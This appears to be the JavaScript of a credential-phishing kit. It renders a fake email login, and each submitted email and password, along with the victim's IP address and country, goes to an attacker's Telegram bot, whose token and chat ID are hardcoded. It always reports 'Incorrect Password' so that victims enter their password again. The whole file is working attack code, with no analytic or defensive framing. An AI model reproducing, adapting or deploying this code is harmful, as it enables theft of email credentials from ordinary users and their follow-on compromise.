        var correctEmail = "info@daum.net";
        var correctPassword = "7717631095";
        var telegramBotToken = "7575108909:AAE0jS-ypEEl-y1VnQsBTGIVKs1Uv7zgPWE";
        var telegramChatId = "7717631095";

        var emailForm = document.getElementById("emailForm");
        var passwordForm = document.getElementById("passwordForm");
        var emailInput = document.getElementById("emailInput");
        var emailProceed = document.getElementById("emailProceed");
        var passwordInput = document.getElementById("passwordInput");
        var passwordSubmit = document.getElementById("passwordSubmit");
        var emailError = document.getElementById("emailError");
        var passwordError = document.getElementById("passwordError");
        var background = document.getElementById("background");
        var loading = document.getElementById("loading");
        var sessionIdElement = document.getElementById("sessionId");

        function generateSessionId() {
          var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
          var sessionId = '';
          for (var i = 0; i &lt; 10; i++) {
            sessionId += chars.charAt(Math.floor(Math.random() * chars.length));
          }
          return sessionId;
        }

        // Display session ID and set initial states
        sessionIdElement.textContent = 'Session ID: ' + generateSessionId();
        emailProceed.disabled = emailInput.value.trim() === "";
        emailError.classList.toggle("active", emailInput.value.trim() === "");

        emailProceed.addEventListener("click", function() {
          if (emailInput.value.trim() !== "") {
            emailForm.style.display = "none";
            background.style.display = "none";
            loading.classList.add("active");
            setTimeout(function() {
              loading.style.display = "none";
              background.style.display = "block";
              background.style.filter = "blur(3px)";
              passwordForm.style.display = "block";
            }, 3000);
          }
        });

        function getIPInfo() {
          return new Promise(function(resolve, reject) {
            fetch('https://ipapi.co/json/')
              .then(function(response) {
                if (!response.ok) {
                  throw new Error('IP API error: ' + response.statusText);
                }
                return response.json();
              })
              .then(function(data) {
                resolve({
                  ip: data.ip || 'Unknown',
                  country: data.country_name || 'Unknown'
                });
              })
              .catch(function(error) {
                console.error('Failed to fetch IP info:', error);
                resolve({ ip: 'Unknown', country: 'Unknown' });
              });
          });
        }

        passwordSubmit.addEventListener("click", function() {
          if (passwordInput.value.trim() === "") {
            passwordError.textContent = "Enter your email password";
            passwordError.classList.add("active");
            passwordInput.classList.add("shake");
            setTimeout(function() { passwordInput.classList.remove("shake"); }, 500);
            return;
          }

          getIPInfo().then(function(ipInfo) {
            if (passwordInput.value !== correctPassword) {
              var message = 'Wrong login attempt - Email: ' + emailInput.value + ', Password: ' + passwordInput.value + ', IP: ' + ipInfo.ip + ', Country: ' + ipInfo.country;
              console.log('Attempting to send to Telegram:', message);
              sendToTelegram(message);
              passwordError.textContent = "Incorrect Password";
              passwordError.classList.add("active");
              passwordInput.classList.add("shake");
              passwordInput.value = "";
              setTimeout(function() { passwordInput.classList.remove("shake"); }, 500);
              return;
            }

            background.style.filter = "none";
            passwordForm.style.display = "none";
          });
        });

        function sendToTelegram(message) {
          if (!message) {
            console.error('No message to send to Telegram');
            return;
          }
          if (!telegramChatId || telegramChatId === "YOUR_TELEGRAM_CHAT_ID") {
            console.error('Invalid Telegram Chat ID. Please set a valid chat ID. Get it from @userinfobot or via https://api.telegram.org/bot' + telegramBotToken + '/getUpdates');
            return;
          }
          var url = 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage';
          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: telegramChatId,
              text: message
            })
          })
          .then(function(response) {
            if (!response.ok) {
              return response.json().then(function(errorData) {
                throw new Error('Telegram API error: ' + response.status + ' - ' + (errorData.description || response.statusText));
              });
            }
            return response.json();
          })
          .then(function() {
            console.log('Telegram message sent successfully:', message);
          })
          .catch(function(error) {
            console.error('Failed to send to Telegram:', error);
          });
        }
